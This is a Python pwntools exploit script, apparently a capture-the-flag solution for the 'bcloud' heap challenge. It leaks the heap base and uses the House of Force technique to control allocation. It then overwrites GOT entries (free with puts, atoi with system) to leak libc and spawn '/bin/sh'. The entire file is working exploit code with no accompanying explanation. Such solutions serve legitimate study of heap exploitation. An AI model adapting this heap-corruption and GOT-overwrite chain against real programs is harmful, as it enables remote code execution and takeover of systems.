from pwn import *

context.log_level ='debug'
sh = process('./bcloud')
elf = ELF('./bcloud')
libc = ELF('libc-2.19.so')

#-----------get heap_base------------
sh.recvuntil('Input your name:\n')
sh.send('a'*64)
#gdb.attach(sh)
sh.recvuntil('a'*64)
heap_base = u32(sh.recv()[:4])-8
print 'heap_base: '+hex(heap_base)

#---------house of force----------------
sh.send('b'*0x40)
#sh.recvuntil('Host:')
sh.sendline(p32(0xffffffff))
#b(0x8048978)
#gdb.attach(sh)#,'b' *0x804895e)

#-----------------------------------------
topchunk_addr = heap_base + 0xd8
print 'topchunk_addr: '+hex(topchunk_addr)
len_addr  = 0x0804b0a0
list_addr = 0x0804b120
target_addr = len_addr - 8
#----------edit topchunk to size[i]--------------
size = target_addr - topchunk_addr-4-7
print str(size)
sh.recvuntil('option--->>\n')
sh.sendline('1')
#sh.recv()
sh.sendline(str(size-4))
sh.recv()
sh.send('\n')

#gdb.attach(sh)
#--------------edit ptr to got_addr---------------

payload = p32(16) *3 + (list_addr-len_addr-12)*'a'
payload += p32(elf.got['free']) +p32( elf.got['atoi'])*2
#+elf.got['atoi'] 

sh.sendline('1')
#sh.recv()
sh.sendline('1000')
sh.recv()
sh.sendline(payload)

#gdb.attach(sh)
#sh.recv()
sh.sendline('3')
sh.sendline('0')
sh.recv()
sh.sendline(p32(elf.plt['puts']))

#---------leak atoi_addr to get system_addr-----------------
sh.sendline('4')
sh.recv()
sh.sendline('1')

#gdb.attach(sh)

atoi_plt = sh.recv()[:4]
#sh.recv()
system_addr = u32(atoi_plt) - libc.symbols['atoi'] + libc.symbols['system']

print 'system_addr: '+hex(system_addr)

#gdb.attach(sh)
#-------------edit atoi to system------------------

sh.sendline('3')
sh.sendline('2')
sh.recv()
sh.sendline(p32(system_addr))
#gdb.attach(sh)
#--------------------- get shell------------------
sh.sendlineafter('option--->>', '/bin/sh\x00')
#sh.send('/bin/sh\x00')

sh.interactive()
